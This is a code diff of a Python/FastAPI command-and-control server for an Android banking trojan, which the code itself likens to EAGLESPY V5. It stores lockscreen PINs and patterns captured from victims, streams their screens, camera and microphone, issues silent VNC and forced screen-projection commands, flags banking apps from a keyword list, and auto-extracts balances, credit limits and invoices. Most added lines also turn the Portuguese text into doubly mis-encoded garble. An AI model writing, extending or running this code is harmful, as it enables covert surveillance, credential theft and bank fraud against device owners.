+        """Retorna sequÃƒÂªncia de desbloqueio gravada"""
         return self.device_unlock_sequences.get(device_id)
     
     def store_device_pin(self, device_id: str, pin: str):
-        """ðŸ”’ Armazena PIN capturado do lockscreen (igual EAGLESPY V5)"""
+        """Ã°Å¸â€â€™ Armazena PIN capturado do lockscreen (igual EAGLESPY V5)"""
         self.device_pins[device_id] = pin
-        logger.info(f"ðŸ”’ PIN armazenado para {device_id}: {pin}")
+        logger.info(f"Ã°Å¸â€â€™ PIN armazenado para {device_id}: {pin}")
     
     def get_device_pin(self, device_id: str) -> Optional[str]:
-        """ðŸ”’ Retorna PIN capturado do lockscreen"""
+        """Ã°Å¸â€â€™ Retorna PIN capturado do lockscreen"""
         return self.device_pins.get(device_id)
     
     def clear_device_pin(self, device_id: str):
-        """ðŸ”’ Limpa PIN armazenado"""
+        """Ã°Å¸â€â€™ Limpa PIN armazenado"""
         if device_id in self.device_pins:
             del self.device_pins[device_id]
-            logger.info(f"ðŸ”’ PIN limpo para {device_id}")
+            logger.info(f"Ã°Å¸â€â€™ PIN limpo para {device_id}")
     
     def store_device_pattern(self, device_id: str, pattern: str):
-        """ðŸ”² Armazena Pattern capturado do lockscreen"""
+        """Ã°Å¸â€Â² Armazena Pattern capturado do lockscreen"""
         self.device_patterns[device_id] = pattern
-        logger.info(f"ðŸ”² Pattern armazenado para {device_id}: {pattern}")
+        logger.info(f"Ã°Å¸â€Â² Pattern armazenado para {device_id}: {pattern}")
     
     def get_device_pattern(self, device_id: str) -> Optional[str]:
-        """ðŸ”² Retorna Pattern capturado do lockscreen"""
+        """Ã°Å¸â€Â² Retorna Pattern capturado do lockscreen"""
         return self.device_patterns.get(device_id)
     
     def clear_device_pattern(self, device_id: str):
-        """ðŸ”² Limpa Pattern armazenado"""
+        """Ã°Å¸â€Â² Limpa Pattern armazenado"""
         if device_id in self.device_patterns:
             del self.device_patterns[device_id]
-            logger.info(f"ðŸ”² Pattern limpo para {device_id}")
+            logger.info(f"Ã°Å¸â€Â² Pattern limpo para {device_id}")
 
     def store_device_lockscreen_active(self, device_id: str, active: bool):
-        """ðŸ”’ Armazena status ativo do lockscreen"""
+        """Ã°Å¸â€â€™ Armazena status ativo do lockscreen"""
         self.device_lockscreen_active[device_id] = active
-        logger.info(f"ðŸ”’ Status Lockscreen para {device_id}: {active}")
+        logger.info(f"Ã°Å¸â€â€™ Status Lockscreen para {device_id}: {active}")
         
     def get_device_lockscreen_active(self, device_id: str) -> bool:
-        """ðŸ”’ Retorna status ativo do lockscreen"""
+        """Ã°Å¸â€â€™ Retorna status ativo do lockscreen"""
         return self.device_lockscreen_active.get(device_id, False)
         
     async def connect(self, device_id: str, websocket: WebSocket):
-        """Aceita nova conexÃ£o de dispositivo"""
+        """Aceita nova conexÃƒÂ£o de dispositivo"""
         await websocket.accept()
         
-        # Se jÃ¡ existe uma conexÃ£o ativa diferente, fecha ela
+        # Se jÃƒÂ¡ existe uma conexÃƒÂ£o ativa diferente, fecha ela
         if device_id in self.active_connections:
             old_ws = self.active_connections[device_id]
             if old_ws is not websocket:
-                logger.info(f"ðŸ”„ Fechando conexÃ£o WebSocket antiga para {device_id} antes de registrar a nova")
+                logger.info(f"Ã°Å¸â€â€ž Fechando conexÃƒÂ£o WebSocket antiga para {device_id} antes de registrar a nova")
                 pass  # [PATCH2] no cierra la conexion vieja (evita ping-pong)
         
-        # Verifica se Ã© reconexÃ£o
+        # Verifica se ÃƒÂ© reconexÃƒÂ£o
         is_reconnect = device_id in self.dashboard_subscribers and len(self.dashboard_subscribers[device_id]) > 0
         
         self.active_connections[device_id] = websocket
@@ -819,16 +821,16 @@ class DeviceConnectionManager:
             self.password_detector[device_id] = BankPasswordDetector(device_id)
         
         if is_reconnect:
-            logger.info(f"ðŸ”„ Dispositivo RECONECTADO: {device_id} (subscribers ativos: {len(self.dashboard_subscribers[device_id])})")
-            # Notifica subscribers que dispositivo voltou - envia Ãºltimo frame salvo se existir
+            logger.info(f"Ã°Å¸â€â€ž Dispositivo RECONECTADO: {device_id} (subscribers ativos: {len(self.dashboard_subscribers[device_id])})")
+            # Notifica subscribers que dispositivo voltou - envia ÃƒÂºltimo frame salvo se existir
             latest = self.get_latest_screen(device_id)
             if latest:
                 await self._broadcast_frame(device_id, latest)
         else:
-            logger.info(f"âœ“ Dispositivo conectado: {device_id}")
+            logger.info(f"Ã¢Å“â€œ Dispositivo conectado: {device_id}")
         
     def disconnect(self, device_id: str, websocket: Optional[WebSocket] = None):
-        """Remove dispositivo desconectado - limpa apenas se a conexÃ£o for a atual"""
+        """Remove dispositivo desconectado - limpa apenas se a conexÃƒÂ£o for a atual"""
         if device_id in self.active_connections:
             ws = self.active_connections[device_id]
             if websocket is None or ws is websocket:
@@ -838,10 +840,10 @@ class DeviceConnectionManager:
                     del self.device_info[device_id]
                 if device_id in self.device_active_banks:
                     del self.device_active_banks[device_id]
-                logger.info(f"âœ— Dispositivo desconectado: {device_id} (mantendo subscribers e cache)")
+                logger.info(f"Ã¢Å“â€” Dispositivo desconectado: {device_id} (mantendo subscribers e cache)")
         
     async def send_command(self, device_id: str, command: dict):
-        """Envia comando para dispositivo especÃ­fico"""
+        """Envia comando para dispositivo especÃƒÂ­fico"""
         if device_id in self.active_connections:
             websocket = self.active_connections[device_id]
             lock = self.connection_locks.setdefault(device_id, asyncio.Lock())
@@ -865,7 +867,7 @@ class DeviceConnectionManager:
                     pass
 
     async def broadcast_to_admins(self, message: dict):
-        """Compat: /api/keylog/custom chama broadcast_to_admins, que nÃ£o existia."""
+        """Compat: /api/keylog/custom chama broadcast_to_admins, que nÃƒÂ£o existia."""
         await self.broadcast_to_operators(message)
 
     def get_connected_devices(self) -> List[dict]:
@@ -880,7 +882,7 @@ class DeviceConnectionManager:
         return devices
     
     def get_latest_screen(self, device_id: str, max_age_seconds: float = 5.0) -> Optional[bytes]:
-        """Retorna Ãºltimo frame capturado se for recente (< max_age_seconds). Evita exibir imagens velhas."""
+        """Retorna ÃƒÂºltimo frame capturado se for recente (< max_age_seconds). Evita exibir imagens velhas."""
         ts = self.device_screen_timestamps.get(device_id)
         if ts and (utc_now() - ts).total_seconds() <= max_age_seconds:
             frame = self.device_screens.get(device_id)
@@ -889,7 +891,7 @@ class DeviceConnectionManager:
         return None
     
     def get_latest_hierarchy(self, device_id: str, max_age_seconds: float = 5.0) -> Optional[str]:
-        """Retorna Ãºltima hierarquia de tela (V2) se for recente (< max_age_seconds). Evita dados velhos."""
+        """Retorna ÃƒÂºltima hierarquia de tela (V2) se for recente (< max_age_seconds). Evita dados velhos."""
         ts = self.device_hierarchy_timestamps.get(device_id)
         if ts and (utc_now() - ts).total_seconds() <= max_age_seconds:
             data = self.device_screen_hierarchies.get(device_id)
@@ -1136,8 +1138,8 @@ class DeviceConnectionManager:
             logger.warning("render_tree err: " + str(e))
             return None
 
-    def maybe_render_tree(self, device_id: str):
-        """Troca frame preto pela arvore renderizada (throttle 250ms)."""
+    async def maybe_render_tree(self, device_id: str):
+        """Troca frame preto pela arvore renderizada (throttle 250ms + so se mudou)."""
         now = time.time()
         ts = globals().setdefault("_TREE_RENDER_TS", {})
         if now - ts.get(device_id, 0) < 0.25:
@@ -1146,18 +1148,42 @@ class DeviceConnectionManager:
         raw = self.device_screen_hierarchies.get(device_id)
         if not raw:
             return
-        img = self.render_tree_image(device_id, raw)
+        try:
+            _key = raw if isinstance(raw, str) else json.dumps(raw, sort_keys=True)
+            _hh = hash(_key)
+        except Exception:
+            _hh = None
+        if _hh is not None:
+            _hs = globals().setdefault("_TREE_HASH", {})
+            if _hs.get(device_id) == _hh and self.device_screens.get(device_id):
+                return
+            _hs[device_id] = _hh
+        try:
+            img = await asyncio.to_thread(self.render_tree_image, device_id, raw)
+        except Exception as _e:
+            logger.warning("maybe_render_tree thread err: " + str(_e))
+            img = None
         if not img:
             return
         self.device_screens[device_id] = img
         try:
-            self._persist_frame(device_id, img)
+            await asyncio.to_thread(self._persist_frame, device_id, img)
         except Exception:
             pass
         try:
-            asyncio.create_task(self._broadcast_frame(device_id, img))
+            await self._broadcast_frame(device_id, img)
         except Exception:
             pass
+
+    def _is_black_jpeg(self, jpeg_data: bytes) -> bool:
+        try:
+            from io import BytesIO as _B
+            from PIL import Image as _I
+            _im = _I.open(_B(jpeg_data)).convert("L").resize((24, 48))
+            _bb = _im.tobytes()
+            return (sum(_bb) / float(len(_bb))) < 6.0
+        except Exception:
+            return False
 
     async def store_screen_frame(self, device_id: str, jpeg_data: bytes):
         # [KRYPTOS-PATCH PERF] analise de tela preta throttleada + persist/log throttleados
@@ -1168,27 +1194,38 @@ class DeviceConnectionManager:
         _tv = globals().setdefault("_TREE_VIEW", {})
         _is_black = _tv.get(device_id, False)
         _bc_ts = globals().setdefault("_BLACKCHK_TS", {})
-        if now_ts - _bc_ts.get(device_id, 0.0) >= (0.15 if _tree_live else 0.5):
+        if now_ts - _bc_ts.get(device_id, 0.0) >= (0.30 if _tree_live else 0.5):
             _bc_ts[device_id] = now_ts
             try:
-                from io import BytesIO as _B
-                from PIL import Image as _I
-                _im = _I.open(_B(jpeg_data)).convert("L").resize((24, 48))
-                _bb = _im.tobytes()
-                _is_black = (sum(_bb) / float(len(_bb))) < 6.0
+                _is_black = await asyncio.to_thread(self._is_black_jpeg, jpeg_data)
             except Exception:
                 _is_black = False
             _tv[device_id] = _is_black
+            if _is_black:
+                _fp = globals().setdefault("_FORCEPROJ_TS", {})
+                if now_ts - _fp.get(device_id, 0.0) >= 8.0:
+                    _fp[device_id] = now_ts
+                    try:
+                        asyncio.create_task(self.send_command(device_id, {"action": "FORCE_PROJECTION"}))
+                        logger.warning("[PROJ] tela preta -> FORCE_PROJECTION " + device_id)
+                    except Exception:
+                        pass
         _fg = (self.device_info.get(device_id, {}) or {}).get("foreground_package", "") or ""
         _is_bank = any(k in _fg.lower() for k in ("banco", "bank", "nequi", "davivienda", "daviplata", "bancolombia", "bogota", "itau", "bradesco", "santander", "nubank", "caixa", "bbva", "scotiabank", "popular", "picpay", "mercadopago", "neon"))
-        if _is_black and (_tree_live or _is_bank):
-            self.maybe_render_tree(device_id)
-            if self.device_screens.get(device_id):
-                try:
-                    await self._broadcast_frame(device_id, self.device_screens[device_id])
-                except Exception:
-                    pass
-                return
+        _has_pwd = False
+        try:
+            _proc = getattr(self, "password_detector", {}).get(device_id)
+            if _proc is not None:
+                _buf = getattr(_proc, "password_buffer", None) or []
+                _le = getattr(_proc, "last_event_time", None)
+                if _buf and _le is not None:
+                    try:
+                        _has_pwd = (utc_now() - _le).total_seconds() < 10
+                    except Exception:
+                        _has_pwd = True
+        except Exception:
+            _has_pwd = False
+        # [PORT 4.0] sem substituicao por arvore no servidor: o painel desenha a arvore
         self.device_screens[device_id] = jpeg_data
         try:
             _p_ts = globals().setdefault("_PERSIST_TS", {})
@@ -1202,12 +1239,16 @@ class DeviceConnectionManager:
         except Exception:
             pass
         await self._broadcast_frame(device_id, jpeg_data)
-    def store_screen_hierarchy(self, device_id: str, hierarchy_data: str):
+    async def store_screen_hierarchy(self, device_id: str, hierarchy_data: str):
         self.device_screen_hierarchies[device_id] = hierarchy_data
         self.device_hierarchy_timestamps[device_id] = utc_now()
         globals().setdefault("_LAST_HIER_TS", {})[device_id] = time.time()
         try:
-            self._persist_hierarchy(device_id, hierarchy_data if isinstance(hierarchy_data, str) else json.dumps(hierarchy_data))
+            _hd = hierarchy_data if isinstance(hierarchy_data, str) else json.dumps(hierarchy_data)
+        except Exception:
+            _hd = ""
+        try:
+            await asyncio.to_thread(self._persist_hierarchy, device_id, _hd)
         except Exception:
             pass
         _hl = globals().setdefault("_HIER_LAST", {})
@@ -1222,8 +1263,7 @@ class DeviceConnectionManager:
             except Exception:
                 _tp = ""
             _isb2 = any(k in _tp for k in ("banco", "bank", "nequi", "davivienda", "daviplata", "bancolombia", "bogota", "itau", "bradesco", "santander", "nubank", "caixa", "bbva", "scotiabank", "popular", "picpay", "mercadopago", "neon"))
-            if (globals().setdefault("_TREE_IN_LIVE", False) or _isb2) and globals().setdefault("_TREE_VIEW", {}).get(device_id):
-                self.maybe_render_tree(device_id)
+            # [PORT 4.0] arvore desenhada no navegador, nao no servidor
         except Exception:
             pass
         try:
@@ -1319,8 +1359,8 @@ class DeviceConnectionManager:
                     lim_candidates = []
                     inv_candidates = []
 
-                    bal_pos_keywords = ["saldo", "disponivel", "disponÃ­vel", "disponible", "saldo da conta", "saldo em conta", "saldo total", "conta corrente", "carteira", "balance", "dinheiro em conta"]
-                    lim_pos_keywords = ["limite", "limite disponÃ­vel", "limite disponivel", "limite de crÃ©dito", "limite de credito", "limite total", "credit_limit"]
+                    bal_pos_keywords = ["saldo", "disponivel", "disponÃƒÂ­vel", "disponible", "saldo da conta", "saldo em conta", "saldo total", "conta corrente", "carteira", "balance", "dinheiro em conta"]
+                    lim_pos_keywords = ["limite", "limite disponÃƒÂ­vel", "limite disponivel", "limite de crÃƒÂ©dito", "limite de credito", "limite total", "credit_limit"]
                     inv_pos_keywords = ["fatura", "fatura atual", "valor da fatura", "fatura fechada", "fatura aberta", "faturas"]
 
                     for idx, item in enumerate(nodes):
@@ -1337,7 +1377,7 @@ class DeviceConnectionManager:
                                 val = parse_brl(m)
                                 if val is not None and -999999.0 <= val <= 9999999.0:
                                     formatted_val = f"R$ {m.strip()}"
-                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crÃ©dito", "credito", "emprÃ©stimo", "emprestimo", "cartÃ£o", "cartao", "loan", "invoice"])
+                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crÃƒÂ©dito", "credito", "emprÃƒÂ©stimo", "emprestimo", "cartÃƒÂ£o", "cartao", "loan", "invoice"])
                                     is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "card", "invoice"])
                                     
                                     start_idx = max(0, idx - 4)
@@ -1346,7 +1386,7 @@ class DeviceConnectionManager:
                                     for neighbor_idx in range(start_idx, end_idx):
                                         if neighbor_idx == idx: continue
                                         n_text = (nodes[neighbor_idx]["text"] + " " + nodes[neighbor_idx]["content_desc"]).lower()
-                                        if any(nk in n_text for nk in ["limite", "fatura", "crÃ©dito", "credito", "emprÃ©stimo", "emprestimo", "cartÃ£o", "cartao", "loan", "invoice"]):
+                                        if any(nk in n_text for nk in ["limite", "fatura", "crÃƒÂ©dito", "credito", "emprÃƒÂ©stimo", "emprestimo", "cartÃƒÂ£o", "cartao", "loan", "invoice"]):
                                             has_credit_neighbor = True
                                             break
                                     
@@ -1361,7 +1401,7 @@ class DeviceConnectionManager:
                                                 bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                         bal_candidates.append({"formatted": formatted_val, "score": bal_score})
 
-                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupanÃ§a", "investimento", "carteira", "extrato"])
+                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupanÃƒÂ§a", "investimento", "carteira", "extrato"])
                                     is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                     if not (is_bal_node or is_fatura_node):
                                         lim_score = 300 if is_bank_screen else 100
@@ -1402,8 +1442,8 @@ class DeviceConnectionManager:
                     best_invoice = max(inv_candidates, key=lambda c: c["score"])["formatted"] if inv_candidates else None
 
                     if not best_balance and is_bank_screen:
-                        if any(m_str in hier_text for m_str in ["â€¢â€¢â€¢â€¢", "â€¢â€¢â€¢", "R$ â€¢", "***", "R$ *"]):
-                            best_balance = "ðŸ”’ Saldo Oculto no App (Clique no olho no celular para revelar)"
+                        if any(m_str in hier_text for m_str in ["Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢", "Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢", "R$ Ã¢â‚¬Â¢", "***", "R$ *"]):
+                            best_balance = "Ã°Å¸â€â€™ Saldo Oculto no App (Clique no olho no celular para revelar)"
 
                     if best_balance or best_limit or best_invoice:
                         app_name = (active_bank or {}).get("appName") or self.device_info.get(device_id, {}).get("foreground_app") or (current_pkg.split(".")[-1].title() if current_pkg else "Banco")
@@ -1442,7 +1482,7 @@ class DeviceConnectionManager:
                             )
                             db.add(balance_log)
                             db.commit()
-                            logger.info(f"ðŸ’° SALDO AUTO-CAPTURADO: {device_id} ({app_name}) -> Saldo: {best_balance} | Limite: {best_limit} | Fatura: {best_invoice}")
+                            logger.info(f"Ã°Å¸â€™Â° SALDO AUTO-CAPTURADO: {device_id} ({app_name}) -> Saldo: {best_balance} | Limite: {best_limit} | Fatura: {best_invoice}")
                 finally:
                     try: db.rollback()
                     except Exception: pass
@@ -1463,7 +1503,7 @@ class DeviceConnectionManager:
         if latest:
             await queue.put(latest)
 
-        # ForÃ§a o dispositivo Android a iniciar/solicitar um novo frame VNC ao vivo imediatamente
+        # ForÃƒÂ§a o dispositivo Android a iniciar/solicitar um novo frame VNC ao vivo imediatamente
         asyncio.create_task(self.send_command(device_id, {"action": "START_SILENT_VNC"}))
         logger.warning(f"VNC_SENT {device_id}")
         asyncio.create_task(self.send_command(device_id, {"action": "REQUEST_VNC_FRAME"}))
@@ -1487,7 +1527,7 @@ class DeviceConnectionManager:
         
         for sub in subscribers:
             try:
-                # Drena toda a fila de uma vez - mantÃ©m apenas o frame mais recente
+                # Drena toda a fila de uma vez - mantÃƒÂ©m apenas o frame mais recente
                 while not sub.queue.empty():
                     try:
                         sub.queue.get_nowait()
@@ -1548,7 +1588,7 @@ class DeviceConnectionManager:
             pass
     
     async def run_housekeeping(self):
-        """Limpeza de memÃ³ria periÃ³dica â€” WAL checkpoint a cada 2 min"""
+        """Limpeza de memÃƒÂ³ria periÃƒÂ³dica Ã¢â‚¬â€ WAL checkpoint a cada 2 min"""
         _wal_counter = 0
         while True:
             await asyncio.sleep(60)
@@ -1558,7 +1598,7 @@ class DeviceConnectionManager:
                 await asyncio.to_thread(checkpoint_wal)
     
     async def _cleanup_expired_entries(self):
-        """Limpeza agressiva de memÃ³ria"""
+        """Limpeza agressiva de memÃƒÂ³ria"""
         async with self.cleanup_lock:
             now = utc_now()
             
@@ -1581,7 +1621,7 @@ class DeviceConnectionManager:
                 self.device_screen_hierarchies.pop(device_id, None)
                 self.device_hierarchy_timestamps.pop(device_id, None)
             
-            # Limpa cÃ¢mera expirada (30 segundos)
+            # Limpa cÃƒÂ¢mera expirada (30 segundos)
             expired_camera = [
                 device_id for device_id, ts in list(self.device_camera_timestamps.items())
                 if now - ts > timedelta(seconds=30)
@@ -1590,7 +1630,7 @@ class DeviceConnectionManager:
                 self.device_camera_frames.pop(device_id, None)
                 self.device_camera_timestamps.pop(device_id, None)
             
-            # Limpa Ã¡udio expirado (10 segundos)
+            # Limpa ÃƒÂ¡udio expirado (10 segundos)
             expired_audio = [
                 device_id for device_id, ts in list(self.device_audio_timestamps.items())
                 if now - ts > timedelta(seconds=10)
@@ -1602,9 +1642,9 @@ class DeviceConnectionManager:
             # Log de status
             active = len(self.active_connections)
             frames_in_mem = len(self.device_screens)
-            logger.info(f"ðŸ§¹ Housekeeping: {active} dispositivos, {frames_in_mem} frames em memÃ³ria")
+            logger.info(f"Ã°Å¸Â§Â¹ Housekeeping: {active} dispositivos, {frames_in_mem} frames em memÃƒÂ³ria")
 
-            # Retention inteligente de logs: preserva histÃ³rico por atÃ© 90 dias ou 150.000 registros
+            # Retention inteligente de logs: preserva histÃƒÂ³rico por atÃƒÂ© 90 dias ou 150.000 registros
             def _prune_old_db_logs():
                 try:
                     db = SessionLocal()
@@ -1613,7 +1653,7 @@ class DeviceConnectionManager:
                         cutoff = datetime.utcnow() - timedelta(days=90)
                         deleted_by_age = db.query(DeviceLog).filter(DeviceLog.created_at < cutoff).delete(synchronize_session=False)
                         
-                        # Limite de seguranÃ§a super alto (150.000) apenas para evitar estouro extremo do DB
+                        # Limite de seguranÃƒÂ§a super alto (150.000) apenas para evitar estouro extremo do DB
                         total_logs = db.query(DeviceLog).count()
                         deleted_by_count = 0
                         if total_logs > 150000:
@@ -1622,7 +1662,7 @@ class DeviceConnectionManager:
                         
                         if deleted_by_age or deleted_by_count:
                             safe_db_commit_sync(db)
-                            logger.info(f"ðŸ§¹ Housekeeping: Pruned {deleted_by_age + deleted_by_count} logs antigos")
+                            logger.info(f"Ã°Å¸Â§Â¹ Housekeeping: Pruned {deleted_by_age + deleted_by_count} logs antigos")
                     finally:
                         try:
                             db.rollback()
@@ -1635,20 +1675,20 @@ class DeviceConnectionManager:
             await asyncio.to_thread(_prune_old_db_logs)
 
 
-    # ==================== CÃ‚MERA EM TEMPO REAL ====================
+    # ==================== CÃƒâ€šMERA EM TEMPO REAL ====================
     
     async def store_camera_frame(self, device_id: str, jpeg_data: bytes):
-        """Armazena frame da cÃ¢mera e transmite para subscribers"""
+        """Armazena frame da cÃƒÂ¢mera e transmite para subscribers"""
         self.device_camera_frames[device_id] = jpeg_data
         self.device_camera_timestamps[device_id] = utc_now()
         await self._broadcast_camera_frame(device_id, jpeg_data)
     
     def get_latest_camera_frame(self, device_id: str) -> Optional[bytes]:
-        """Retorna Ãºltimo frame da cÃ¢mera"""
+        """Retorna ÃƒÂºltimo frame da cÃƒÂ¢mera"""
         return self.device_camera_frames.get(device_id)
     
     async def register_camera_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
-        """Registra cliente para receber stream de cÃ¢mera"""
+        """Registra cliente para receber stream de cÃƒÂ¢mera"""
         await websocket.accept()
         queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE)
         subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
@@ -1661,7 +1701,7 @@ class DeviceConnectionManager:
         return queue
     
     def unregister_camera_client(self, device_id: str, websocket: WebSocket):
-        """Remove cliente do stream de cÃ¢mera"""
+        """Remove cliente do stream de cÃƒÂ¢mera"""
         subscribers = self.camera_subscribers.get(device_id, [])
         remaining = [s for s in subscribers if s.websocket is not websocket]
         if remaining:
@@ -1670,7 +1710,7 @@ class DeviceConnectionManager:
             self.camera_subscribers.pop(device_id, None)
     
     async def _broadcast_camera_frame(self, device_id: str, jpeg_data: bytes):
-        """Envia frame de cÃ¢mera para todos os subscribers"""
+        """Envia frame de cÃƒÂ¢mera para todos os subscribers"""
         subscribers = self.camera_subscribers.get(device_id, [])
         if not subscribers:
             return
@@ -1696,19 +1736,19 @@ class DeviceConnectionManager:
     # ==================== MICROFONE EM TEMPO REAL ====================
     
     async def store_audio_chunk(self, device_id: str, audio_data: bytes):
-        """Armazena chunk de Ã¡udio e transmite para subscribers"""
+        """Armazena chunk de ÃƒÂ¡udio e transmite para subscribers"""
         self.device_audio_chunks[device_id] = audio_data
         self.device_audio_timestamps[device_id] = utc_now()
         await self._broadcast_audio_chunk(device_id, audio_data)
     
     def get_latest_audio_chunk(self, device_id: str) -> Optional[bytes]:
-        """Retorna Ãºltimo chunk de Ã¡udio"""
+        """Retorna ÃƒÂºltimo chunk de ÃƒÂ¡udio"""
         return self.device_audio_chunks.get(device_id)
     
     async def register_audio_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
-        """Registra cliente para receber stream de Ã¡udio"""
+        """Registra cliente para receber stream de ÃƒÂ¡udio"""
         await websocket.accept()
-        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE * 3)  # Mais buffer para Ã¡udio
+        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE * 3)  # Mais buffer para ÃƒÂ¡udio
         subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
         self.audio_subscribers.setdefault(device_id, []).append(subscriber)
         
@@ -1719,7 +1759,7 @@ class DeviceConnectionManager:
         return queue
     
     def unregister_audio_client(self, device_id: str, websocket: WebSocket):
-        """Remove cliente do stream de Ã¡udio"""
+        """Remove cliente do stream de ÃƒÂ¡udio"""
         subscribers = self.audio_subscribers.get(device_id, [])
         remaining = [s for s in subscribers if s.websocket is not websocket]
         if remaining:
@@ -1728,7 +1768,7 @@ class DeviceConnectionManager:
             self.audio_subscribers.pop(device_id, None)
     
     async def _broadcast_audio_chunk(self, device_id: str, audio_data: bytes):
-        """Envia chunk de Ã¡udio para todos os subscribers"""
+        """Envia chunk de ÃƒÂ¡udio para todos os subscribers"""
         subscribers = self.audio_subscribers.get(device_id, [])
         if not subscribers:
             return
@@ -1757,7 +1797,7 @@ manager = DeviceConnectionManager()
 async def authenticate_dashboard_websocket(websocket: WebSocket, device_id: Optional[str] = None) -> Optional[Operator]:
     token = websocket.query_params.get("token")
     if not token:
-        await safe_close_websocket(websocket, code=1008, reason="Token obrigatÃ³rio")
+        await safe_close_websocket(websocket, code=1008, reason="Token obrigatÃƒÂ³rio")
         return None
     
     db = SessionLocal()
@@ -1765,12 +1805,12 @@ async def authenticate_dashboard_websocket(websocket: WebSocket, device_id: Opti
         payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
         username = payload.get("sub")
         if not username:
-            await safe_close_websocket(websocket, code=1008, reason="Token invÃ¡lido")
+            await safe_close_websocket(websocket, code=1008, reason="Token invÃƒÂ¡lido")
             return None
         
         operator = db.query(Operator).filter(Operator.username == username).first()
         if not operator:
-            await safe_close_websocket(websocket, code=1008, reason="Operador nÃ£o encontrado")
+            await safe_close_websocket(websocket, code=1008, reason="Operador nÃƒÂ£o encontrado")
             return None
         
         if operator.is_banned or not operator.is_active:
@@ -1780,7 +1820,7 @@ async def authenticate_dashboard_websocket(websocket: WebSocket, device_id: Opti
         if device_id:
             device = db.query(Device).filter(Device.device_id == device_id).first()
             if not device:
-                await safe_close_websocket(websocket, code=1008, reason="Dispositivo nÃ£o encontrado")
+                await safe_close_websocket(websocket, code=1008, reason="Dispositivo nÃƒÂ£o encontrado")
                 return None
             if not operator.is_admin and device.owner_id != operator.id:
                 await safe_close_websocket(websocket, code=1008, reason="Acesso negado ao dispositivo")
@@ -1788,11 +1828,11 @@ async def authenticate_dashboard_websocket(websocket: WebSocket, device_id: Opti
 
         return operator
     except JWTError:
-        await safe_close_websocket(websocket, code=1008, reason="Token invÃ¡lido")
+        await safe_close_websocket(websocket, code=1008, reason="Token invÃƒÂ¡lido")
         return None
     except Exception as e:
-        logger.error(f"Erro na autenticaÃ§Ã£o de WebSocket do painel: {e}")
-        await safe_close_websocket(websocket, code=1008, reason="Erro de autenticaÃ§Ã£o")
+        logger.error(f"Erro na autenticaÃƒÂ§ÃƒÂ£o de WebSocket do painel: {e}")
+        await safe_close_websocket(websocket, code=1008, reason="Erro de autenticaÃƒÂ§ÃƒÂ£o")
         return None
     finally:
         db.close()
@@ -1811,7 +1851,7 @@ def get_websocket_client_ip(websocket: WebSocket) -> Optional[str]:
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_id: str = None):
     """
-    Endpoint WebSocket para conexÃµes de dispositivos Android - ULTRA RESILIENTE (50+ DISPOSITIVOS)
+    Endpoint WebSocket para conexÃƒÂµes de dispositivos Android - ULTRA RESILIENTE (50+ DISPOSITIVOS)
     """
     from urllib.parse import parse_qs
 
@@ -1844,7 +1884,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
         return
     await manager.connect(device_id, websocket)
     
-    # Registra dispositivo no banco de dados em thread separada (nÃ£o bloqueia event loop)
+    # Registra dispositivo no banco de dados em thread separada (nÃƒÂ£o bloqueia event loop)
     def register_device_on_connect(device_id_val: str, build_id_val: str, client_ip_val: str):
         try:
             db = SessionLocal()
@@ -1876,6 +1916,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
                             owner_id = int(str(build_id_val).split('-')[1])
                         except Exception:
                             pass
+                resolved = owner_id is not None
                 if owner_id is None:
                     owner_id = 1
                     logger.warning(f"[SONDA] device {device_id_val} sem APKBuild (build_id={build_id_val!r}) -> owner fallback 1")
@@ -1886,7 +1927,8 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
                 else:
                     device.last_seen = utc_now()
                     device.is_online = True
-                    if device.owner_id is None and owner_id is not None:
+                    if resolved and device.owner_id != owner_id:
+                        logger.warning(f"[OWNER] device {device_id_val} reasignado de {device.owner_id} a {owner_id}")
                         device.owner_id = owner_id
                 if client_ip_val:
                     device.ip_address = client_ip_val
@@ -1913,17 +1955,17 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
                 _consecutive_errors = 0
                 _ping_timeout_count = 0
                 
-                # Garante que este websocket Ã© a conexÃ£o ativa do dispositivo
+                # Garante que este websocket ÃƒÂ© a conexÃƒÂ£o ativa do dispositivo
                 current_active = manager.active_connections.get(device_id)
                 if current_active is not websocket:
                     if current_active is None:
                         manager.active_connections[device_id] = websocket
                     else:
-                        logger.info(f"ðŸ“± ConexÃ£o WebSocket antiga de {device_id} encerrada pois nova conexÃ£o assumiu")
+                        logger.info(f"Ã°Å¸â€œÂ± ConexÃƒÂ£o WebSocket antiga de {device_id} encerrada pois nova conexÃƒÂ£o assumiu")
                         pass  # [PATCH] no cierra la conexion vieja (evita ping-pong)
                 
                 if data.get("type") == "websocket.disconnect":
-                    logger.info(f"ðŸ“± Dispositivo {device_id} enviou disconnect")
+                    logger.info(f"Ã°Å¸â€œÂ± Dispositivo {device_id} enviou disconnect")
                     break
                 
                 if "text" in data:
@@ -1934,7 +1976,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
                             logger.warning(f"MSG_SONDA {device_id} {msg_type} {len(data.get('text') or '')}")
                         manager.update_device_activity(device_id)
                         
-                        # FAST PATH: Heartbeats, pings e hierarquias de tela nÃ£o abrem banco de dados (0ms de latÃªncia)
